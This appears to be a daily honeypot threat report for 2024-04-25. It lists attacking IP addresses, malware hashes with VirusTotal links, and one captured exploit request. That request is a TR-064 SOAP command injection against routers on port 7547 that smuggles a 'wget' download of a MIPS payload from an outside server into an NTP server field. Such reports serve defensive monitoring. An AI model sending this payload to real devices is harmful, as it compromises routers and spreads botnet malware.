@@ -1,0 +1,36 @@
+Top 5 IPs for 2024-04-25 :
+
+171.103.225.34
+162.240.149.176
+54.77.138.169
+117.203.30.221
+115.55.237.84
+
+
+Malware Download:
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+https://www.virustotal.com/gui/file/77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+Malicious Commands seen:
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7547
+User-Agent: Messiah/2.0
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 526
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">   <NewNTPServer1>`cd /tmp;wget http://213.232.235.166/mips;`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+Attack IP : 1.214.81.246
+
+
+
+
